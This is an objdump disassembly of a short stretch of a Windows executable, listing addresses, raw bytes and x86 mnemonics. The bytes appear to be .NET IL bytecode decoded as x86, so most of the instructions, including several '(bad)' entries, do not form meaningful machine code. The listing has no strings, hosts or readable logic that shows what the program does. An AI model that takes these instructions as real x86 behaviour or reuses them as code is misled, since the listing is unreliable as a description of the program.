  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 58             	or     0x58(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 5e                	jb     0x403e1f
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 be                	jb     0x403d90
  403dd2:	25 00 70 28 25       	and    $0x25287000,%eax
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	0a 3a                	or     (%edx),%bh
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 c8                	jb     0x403daa
  403de2:	25 00 70 28 25       	and    $0x25287000,%eax
  403de7:	00 00                	add    %al,(%eax)
  403de9:	0a 3a                	or     (%edx),%bh
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 d6                	jb     0x403dc8
  403df2:	25 00 70 28 25       	and    $0x25287000,%eax
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 3a                	or     (%edx),%bh
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 5e 21 00       	and    $0x215e72,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 be                	jb     0x403dda
  403e1c:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e21:	00 00                	add    %al,(%eax)
  403e23:	06                   	push   %es
  403e24:	25 72 76 21 00       	and    $0x217672,%eax
  403e29:	70 6f                	jo     0x403e9a
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 ec                	jb     0x403e3f
  403e53:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e58:	00 00                	add    %al,(%eax)
  403e5a:	06                   	push   %es
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 5e 21 00       	and    $0x215e72,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 f4                	jb     0x403e7b
  403e87:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e8c:	00 00                	add    %al,(%eax)
  403e8e:	06                   	push   %es
  403e8f:	25 72 0a 26 00       	and    $0x260a72,%eax
  403e94:	70 6f                	jo     0x403f05
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 ec                	jb     0x403e89
  403e9d:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea2:	00 00                	add    %al,(%eax)
  403ea4:	06                   	push   %es
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 18                	jb     0x403ef3
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 ec                	jb     0x403ed7
  403eeb:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	06                   	push   %es
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 ec             	or     %esi,-0x14(%edx)
  403f1e:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f23:	00 00                	add    %al,(%eax)
  403f25:	06                   	push   %es
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 18                	jb     0x403f46
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 ec                	jb     0x403fd4
  403fe8:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403fed:	00 00                	add    %al,(%eax)
  403fef:	06                   	push   %es
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 22             	or     0x22(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 3e             	add    %dh,0x3e(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 46                	jb     0x40410b
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 74                	jb     0x404187
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 bc             	add    %dh,-0x44(%edx)
  404180:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
